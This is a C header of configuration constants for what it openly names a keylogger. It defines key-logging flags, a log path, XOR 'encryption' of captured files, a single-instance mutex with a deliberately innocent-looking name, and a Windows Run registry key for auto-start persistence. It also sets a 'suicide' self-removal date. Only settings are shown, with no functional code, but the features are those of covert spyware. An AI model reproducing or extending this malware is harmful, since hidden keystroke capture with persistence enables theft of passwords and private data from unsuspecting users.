#pragma once

/***************** DEBUG **************/
#define DEBUG					(TRUE)	// Simply log functions
#define DEBUG_VERBOOS			(FALSE) // Log also pressed keys for extensive debugging
#define DEBUG_MSGBOX			(FALSE) // Show debug message in a message box (annoying..)
#define DEBUG_LOG				(TRUE)  // Log debug messages to a file (see LOG_DEBUG_PATH)
/***************** BUFFER **************/
#define BUFFER_SIZE				(128)
#define BUFFER_SIZE_BIG			(BUFFER_SIZE * 10)
/***************** LOGGING **************/
#define LOG_DEBUG_PATH			L"keylogger.log"
#define LOG_KEYS_PREFIX_PATH	L"PIE" // Prefix for all result files
#define FILE_SIZE_TO_ENC		(2 * 1024 * 1024) // 2MB
/***************** ENCRYPTION **************/
#define ENC_XOR_KEY				(0x99)
/***************** MUTEX **************/
#define MUTEX_SINGLE_INSTANCE	(L"SuperInnocentMutex123")
/***************** REGISTRY **************/
#define REGISTRY_STARTUP_PATH	(L"Software\\Microsoft\\Windows\\CurrentVersion\\Run")
#define REGISTRY_STARTUP_KEY	(L"SuperInnocentKeylogger")
/***************** SUICIDE **************/
#define SUICIDE_TIME_YEAR		(2019)
#define SUICIDE_TIME_MONTH		(1)
#define SUICIDE_TIME_DAY		(1)